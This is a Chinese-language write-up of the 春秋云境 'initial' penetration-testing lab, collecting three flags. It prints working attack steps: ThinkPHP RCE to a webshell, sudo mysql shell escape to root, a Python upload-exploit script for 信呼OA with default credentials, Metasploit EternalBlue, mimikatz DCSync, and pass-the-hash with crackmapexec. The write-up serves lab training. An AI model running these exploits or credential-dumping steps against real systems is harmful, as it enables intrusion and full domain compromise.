---
title: "春秋云境-initial"
date: 2025-12-11T00:00:00+08:00
draft: false

---

# 春秋云境-initial

### flag1

进入环境，发现80端口开启，看图标疑似thinkphp，指纹识别发现确实是tp5：

![image-20241104195522644](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241104195524365-730576929.png)

一把梭哈发现存在RCE：

![image-20241104200029894](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241104200032299-213537080.png)

直接写webshell连接上线：

![image-20241104200225940](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241104200228383-1910156193.png)

当前权限为www-data：

![image-20241104200357889](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241104200359418-748120365.png)

尝试权限提升，信息搜集发现`/usr/bin/mysql`可以无密码sudo：

![image-20241104200502549](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241104200504226-1544502306.png)

看看怎么打sudo提权：

![image-20241104200528555](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241104200530175-1170921251.png)

ok会了，直接提权到root：

~~~shell
sudo /usr/bin/mysql -e '\! /bin/sh'
~~~

按理说这里应该没问题的，由于是webshell所以不能获取新的bash，改成ls：

~~~shell
sudo /usr/bin/mysql -e '\! ls -al /root'
~~~

![image-20241104200837187](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241104200839021-1350028007.png)

flag在root中，直接读：

~~~shell
sudo /usr/bin/mysql -e '\! cat /root/flag'
~~~

![image-20241104200954226](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241104200955843-238395799.png)

哦？再来

~~~shell
sudo /usr/bin/mysql -e '\! ls /root/flag'
~~~

![image-20241104201032186](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241104201033738-2105142707.png)

行，再读：

![image-20241104201101219](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241104201102925-1640075295.png)

拿到flag1：

~~~
flag{60b53231-
~~~

### flag2

内网网段为：`172.22.1.0/24`：

![image-20241104201918524](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241104201920209-1463851286.png)

fscan传上去扫扫内网：

![image-20241104202106867](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241104202109074-1681115414.png)

有如下关键信息：

~~~
172.22.1.2:DC域控
172.22.1.21:Windows的机器并且存在MS17-010 漏洞
172.22.1.18:信呼OA办公系统
~~~

那么先从信呼OA办公系统入手吧，搭个隧道：

![image-20241104204129702](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241104204131644-563607981.png)

![image-20241104204142813](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241104204144681-1047287662.png)

然后proxifier配置物理机代理后访问信呼OA办公系统：

![image-20241104205348582](C:\Users\煜阳\AppData\Roaming\Typora\typora-user-images\image-20241104205348582.png)

弱口令admin：admin123登录成功

这个系统存在文件上传漏洞的day（脚本的同目录写一个名为1.php的一句话木马）：

~~~python
import requests


session = requests.session()

url_pre = 'http://172.22.1.18/'
url1 = url_pre + '?a=check&m=login&d=&ajaxbool=true&rnd=533953'
url2 = url_pre + '/index.php?a=upfile&m=upload&d=public&maxsize=100&ajaxbool=true&rnd=798913'
url3 = url_pre + '/task.php?m=qcloudCos|runt&a=run&fileid=11'

data1 = {
    'rempass': '0',
    'jmpass': 'false',
    'device': '1625884034525',
    'ltype': '0',
    'adminuser': 'YWRtaW4=',
    'adminpass': 'YWRtaW4xMjM=',
    'yanzm': ''
}


r = session.post(url1, data=data1)
r = session.post(url2, files={'file': open('1.php', 'r+')})

filepath = str(r.json()['filepath'])
filepath = "/" + filepath.split('.uptemp')[0] + '.php'
id = r.json()['id']

url3 = url_pre + f'/task.php?m=qcloudCos|runt&a=run&fileid={id}'

r = session.get(url3)
r = session.get(url_pre + filepath + "?1=system('dir');")
print(r.text)

~~~

![image-20241104211218096](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241104211220278-416041289.png)

获得了上传路径：

~~~
/upload/2024-11/04_21110473.php
~~~

连接即可：

![image-20241104211431304](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241104211433219-1510452073.png)

开启终端发现是system权限：

![image-20241104211522639](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241104211524324-1050478114.png)

找flag，会后在`C:/Users/Administrator/flag/flag02.txt`中拿到flag2：

~~~
2ce3-4813-87d4-
~~~

![image-20241104211644614](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241104211646662-545805511.png)

让我打域控了hhh

### flag3

先打ms17-010，所以给kali也配置proxychains代理：

~~~shell
socks5  1.94.63.197 1080
~~~

然后用proxychains启动msf：

~~~shell
proxychains msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set payload windows/x64/meterpreter/bind_tcp_uuid
set RHOSTS 172.22.1.21
run
~~~

成功getshell

![image-20241104212642214](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241104212646405-1532797848.png)

前面fscan可知这台机子是enterprise用户，接下来DCSync打域控：

~~~shell
load kiwi  # 调用mimikatz模块
kiwi_cmd "lsadump::dcsync /domain:xiaorang.lab /all /csv" exit
~~~

![image-20241104213549938](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241104213552477-2012680657.png)

获取了Administrator的密码hash，直接打PTH：

最后使用crackmapexec.py拿到了DC的shell：

~~~shell
proxychains crackmapexec smb 172.22.1.2 -u administrator -H 10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x "type C:\Users\Administrator\flag\flag03"
~~~

![image-20241104215121669](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241104215124635-2024587371.png)

flag3:

~~~
e8f88d0d43d6}
~~~

拿下